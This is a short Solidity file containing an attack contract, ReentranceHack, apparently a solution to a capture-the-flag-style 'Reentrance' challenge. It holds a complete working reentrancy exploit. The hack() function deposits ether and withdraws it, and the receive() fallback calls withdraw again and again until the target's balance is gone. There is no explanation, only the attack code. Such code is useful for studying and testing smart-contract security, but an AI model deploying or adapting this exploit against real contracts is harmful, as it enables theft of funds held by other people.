// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceHack {
    Reentrance public reentrance;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function hack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance >= msg.value) {
            reentrance.withdraw(msg.value);
        }
    }
}
